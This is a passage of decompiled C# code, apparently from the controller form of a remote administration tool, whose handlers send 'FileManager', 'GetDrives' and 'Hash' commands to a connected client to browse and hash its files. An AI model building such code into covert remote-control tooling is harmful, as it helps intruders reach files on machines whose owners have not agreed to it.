				this.SearchTextInListView(this.Guna2TextBox2.Text, this.ListView1, 0);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060001B8 RID: 440 RVA: 0x0000F174 File Offset: 0x0000D374
		private void Guna2TextBox2_KeyPress(object sender, KeyPressEventArgs e)
		{
			bool flag = Operators.CompareString(Conversions.ToString(e.KeyChar), "\b", false) == 0;
			bool flag2 = flag;
			if (flag2)
			{
				bool flag3 = this.Guna2TextBox2.Text.Length == 1;
				bool flag4 = flag3;
				if (flag4)
				{
					try
					{
						try
						{
							bool flag5 = Operators.CompareString(this.Guna2TextBox1.Text, "", false) != 0;
							bool flag6 = flag5;
							if (flag6)
							{
								byte[] state = Helper.SB("FileManager" + SettingsHelper.SPL + this.Guna2TextBox1.Text);
								Client $VB$NonLocal_2 = this.C;
								ThreadPool.QueueUserWorkItem(delegate(object a0)
								{
									$VB$NonLocal_2.BeginSend((byte[])a0);
								}, state);
							}
							else
							{
								byte[] state2 = Helper.SB("GetDrives");
								Client $VB$NonLocal_3 = this.C;
								ThreadPool.QueueUserWorkItem(delegate(object a0)
								{
									$VB$NonLocal_3.BeginSend((byte[])a0);
								}, state2);
							}
						}
						catch (Exception ex)
						{
						}
					}
					catch (Exception ex2)
					{
						Debug.WriteLine(ex2.Message);
					}
				}
			}
		}

		// Token: 0x060001B9 RID: 441 RVA: 0x0000F2BC File Offset: 0x0000D4BC
		private void FileHashToolStripMenuItem_Click(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("Hash" + SettingsHelper.SPL + this.Guna2TextBox1.Text + this.ListView1.FocusedItem.Text);
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x040000AA RID: 170
		public Client C;

		// Token: 0x040000AB RID: 171
		public string CID;

		// Token: 0x040000AC RID: 172
		public string ccppath;

		// Token: 0x040000AD RID: 173
		public string ccps;
	}
}
